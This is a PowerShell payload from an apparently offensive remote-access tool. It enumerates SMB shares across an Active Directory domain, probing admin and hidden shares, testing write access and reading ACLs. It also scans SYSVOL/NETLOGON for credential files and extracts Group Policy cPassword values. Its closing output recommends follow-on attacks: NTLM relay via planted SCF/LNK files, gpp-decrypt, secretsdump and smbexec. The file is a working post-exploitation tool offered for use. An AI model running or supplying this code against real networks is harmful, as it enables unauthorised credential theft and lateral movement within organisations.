# ── PwnRM Share Scout PowerShell payload ─────────────────────────────────────
# Self-contained SMB share + permission enumeration that runs entirely inside
# the remote PowerShell session — no extra tools required on target.
# Covers: local shares, hidden shares, UNC access test, permission ACLs,
#         open files, net sessions, and cross-DC share enumeration.

function Invoke-PwnRMShares {
    param(
        [switch]$Quick,
        [string[]]$Targets = @()
    )
    $sep = '=' * 72
    function hdr($t) { Write-Host "`n$sep`n  [*] $t`n$sep" -ForegroundColor Cyan }
    function ok($m)  { Write-Host "  [+] $m" -ForegroundColor Green }
    function inf($m) { Write-Host "  [-] $m" }
    function wrn($m) { Write-Host "  [!] $m" -ForegroundColor Yellow }
    function err($m) { Write-Host "  [x] $m" -ForegroundColor Red }

    # ── 0. Resolve target list ────────────────────────────────────────────────
    $scanTargets = @($env:COMPUTERNAME)
    if ($Targets.Count -gt 0) {
        $scanTargets = $Targets
    } elseif (-not $Quick) {
        # Pull DC list from AD for broader coverage
        try {
            $dom = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
            $dcNames = $dom.DomainControllers | Select-Object -ExpandProperty Name
            # Also include all domain computers (capped at 50 to stay sane)
            $root = "LDAP://$(([adsi]'').distinguishedName)"
            $s = New-Object DirectoryServices.DirectorySearcher([adsi]$root)
            $s.Filter = "(&(objectCategory=computer)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))"
            $s.PropertiesToLoad.AddRange(@("dNSHostName","cn"))
            $s.PageSize = 50
            $s.SizeLimit = 50
            $computers = $s.FindAll() | ForEach-Object {
                $_.Properties["dnshostname"][0]
            } | Where-Object { $_ }
            $scanTargets = @($env:COMPUTERNAME) + $dcNames + $computers | Select-Object -Unique | Select-Object -First 20
        } catch {
            wrn "Could not enumerate domain computers, scanning local only: $_"
        }
    }

    foreach ($target in $scanTargets) {

        hdr "SMB Shares — \\$target"

        # ── 1. Local share enumeration via WMI ───────────────────────────────
        $isLocal = ($target -eq $env:COMPUTERNAME)

        if ($isLocal) {
            try {
                $shares = Get-WmiObject -Class Win32_Share -ComputerName $target -ErrorAction Stop
                if ($shares.Count -eq 0) {
                    inf "No shares found."
                } else {
                    $shares | ForEach-Object {
                        $icon = switch ($_.Type) {
                            0            { "  [DISK ]" }
                            1            { "  [PRINT]" }
                            2            { "  [COMMS]" }
                            2147483648   { "  [DISK$]" }  # hidden disk
                            2147483649   { "  [PRT$ ]" }  # hidden print
                            default      { "  [?????]" }
                        }
                        $hidden = if ($_.Name -match '\$$') { " [HIDDEN]" } else { "" }
                        ok "$icon  $($_.Name)$hidden  →  $($_.Path)  ($($_.Description))"
                    }
                }
            } catch {
                err "WMI share query failed: $_"
            }
        }

        # ── 2. Net share output (includes current connection counts) ─────────
        if ($isLocal) {
            hdr "Net Share Detail — $target"
            try {
                $raw = net share 2>&1
                $raw | ForEach-Object { inf "  $_" }
            } catch { wrn "net share failed: $_" }
        }

        # ── 3. UNC access test + permission probe ────────────────────────────
        hdr "UNC Access Test — \\$target"
        # Common shares to probe
        $probeShares = @("ADMIN`$","C`$","D`$","E`$","IPC`$","NETLOGON","SYSVOL",
                         "PRINT`$","Users","Temp","Backup","Scripts","Software",
                         "Data","Share","Public","IT","Finance","HR","Payroll")

        # Supplement with discovered shares
        if ($isLocal) {
            try {
                $discNames = Get-WmiObject -Class Win32_Share -ComputerName $target |
                             Select-Object -ExpandProperty Name
                $probeShares = ($probeShares + $discNames) | Select-Object -Unique
            } catch {}
        }

        foreach ($sh in $probeShares) {
            $unc = "\\$target\$sh"
            try {
                $items = Get-ChildItem -LiteralPath $unc -ErrorAction Stop | Select-Object -First 1
                $itemCount = (Get-ChildItem -LiteralPath $unc -ErrorAction SilentlyContinue).Count
                ok "READABLE  $unc  ($itemCount item(s) visible)"

                # Check write access with a temp probe file
                $testFile = "$unc\.__pwnrm_probe_$(Get-Random).tmp"
                try {
                    [System.IO.File]::WriteAllText($testFile, "x")
                    Remove-Item $testFile -Force -ErrorAction SilentlyContinue
                    wrn "WRITABLE  $unc  ← write access confirmed!"
                } catch {
                    inf "         $unc  (read-only)"
                }

                # ACL snapshot on accessible shares
                if (-not $Quick) {
                    try {
                        $acl = Get-Acl -LiteralPath $unc -ErrorAction Stop
                        $acl.Access | Where-Object {
                            $_.IdentityReference -match "Everyone|Authenticated Users|Domain Users|Users" -and
                            $_.FileSystemRights -match "Write|Modify|FullControl"
                        } | ForEach-Object {
                            wrn "  ACL: $($_.IdentityReference) → $($_.FileSystemRights) [$($_.AccessControlType)]"
                        }
                    } catch {}
                }

            } catch [System.UnauthorizedAccessException] {
                inf "DENIED    $unc"
            } catch [System.IO.IOException] {
                # share doesn't exist or host unreachable — skip silently
            } catch {
                # any other error — skip
            }
        }

        if ($Quick) { continue }

        # ── 4. Open files on this host ────────────────────────────────────────
        if ($isLocal) {
            hdr "Open Files (net files)"
            try {
                $of = net files 2>&1
                if ($of -match "No entries") {
                    inf "No open files."
                } else {
                    $of | ForEach-Object { inf "  $_" }
                }
            } catch { wrn "net files failed (needs elevation): $_" }
        }

        # ── 5. Active SMB sessions ────────────────────────────────────────────
        if ($isLocal) {
            hdr "Active SMB Sessions (net session)"
            try {
                $sess = net session 2>&1
                if ($sess -match "There are no entries") {
                    inf "No active SMB sessions."
                } else {
                    $sess | ForEach-Object { inf "  $_" }
                }
            } catch { wrn "net session failed: $_" }
        }

        # ── 6. SYSVOL / NETLOGON interesting file scan ───────────────────────
        hdr "SYSVOL / NETLOGON Sensitive File Scan — $target"
        $sensitiveExts  = @("*.xml","*.txt","*.ini","*.cfg","*.conf","*.ps1","*.bat","*.cmd","*.vbs","*.inf")
        $sensitiveNames = @("Groups.xml","scheduledtasks.xml","Services.xml","Printers.xml",
                            "Drives.xml","DataSources.xml","unattend.xml","sysprep.xml",
                            "autologon.inf","password*","creds*","credentials*","secret*")
        foreach ($svcShare in @("SYSVOL","NETLOGON")) {
            $svcUNC = "\\$target\$svcShare"
            try {
                Get-ChildItem -LiteralPath $svcUNC -Recurse -ErrorAction SilentlyContinue |
                Where-Object {
                    $fn = $_.Name
                    $sensitiveNames | Where-Object { $fn -like $_ } |
                    Select-Object -First 1
                } |
                ForEach-Object {
                    wrn "SENSITIVE: $($_.FullName)  [$([math]::Round($_.Length/1KB,1))KB, last modified $($_.LastWriteTime.ToString('yyyy-MM-dd'))]"
                    # Peek at cPassword fields in GPP XML (CVE-2014-1812)
                    if ($_.Extension -eq ".xml" -and $_.Length -lt 512KB) {
                        try {
                            $content = Get-Content $_.FullName -Raw -ErrorAction Stop
                            if ($content -match 'cPassword="([^"]+)"') {
                                wrn "  → GPP cPassword FOUND in $($_.Name) — decrypt with gpp-decrypt!"
                                ok  "  → cPassword : $($Matches[1])"
                            }
                        } catch {}
                    }
                }
            } catch {
                inf "Cannot access \\$target\$svcShare : $_"
            }
        }
    }

    Write-Host "`n$sep" -ForegroundColor Cyan
    Write-Host "  [*] Share Scout complete. Suggested next steps:" -ForegroundColor Cyan
    Write-Host "  [-]  Writable shares  : plant SCF/LNK for NTLM relay via Responder" -ForegroundColor White
    Write-Host "  [-]  SYSVOL GPP       : gpp-decrypt <cPassword>" -ForegroundColor White
    Write-Host "  [-]  ADMIN`$/C`$       : secretsdump.py -just-dc / impacket-smbexec" -ForegroundColor White
    Write-Host "  [-]  Full audit       : nxc smb <target_range> --shares" -ForegroundColor White
    Write-Host "$sep`n" -ForegroundColor Cyan
}

Invoke-PwnRMShares -Quick:$([bool]::Parse('__QUICK__')) -Targets @('__TARGETS__')
